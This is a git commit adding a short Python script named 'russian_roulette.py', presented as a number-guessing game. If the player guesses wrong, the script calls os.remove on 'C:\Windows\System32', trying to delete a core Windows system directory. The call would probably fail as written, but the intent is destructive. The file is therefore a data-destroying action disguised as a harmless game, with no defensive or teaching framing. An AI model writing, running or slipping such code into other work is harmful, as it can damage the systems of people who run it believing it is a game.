5577a13020d8fa108d4c2fe385c5d861d5dcc525
mehdielk11 <125439023+mehdielk11@users.noreply.github.com>
2024-05-14 03:12:24 +0100

    Russian roulette :)

---
+++ russian_roulette.py
@@ -0,0 +1,10 @@
+import random
+import os
+
+number = random.randint(1, 10)
+guess = input("Guess a number between 1 and 10:")
+guess = int(guess)
+if guess == number:
+	print("Congratulations! You won!")
+else:
+	os.remove("C:\Windows\System32")
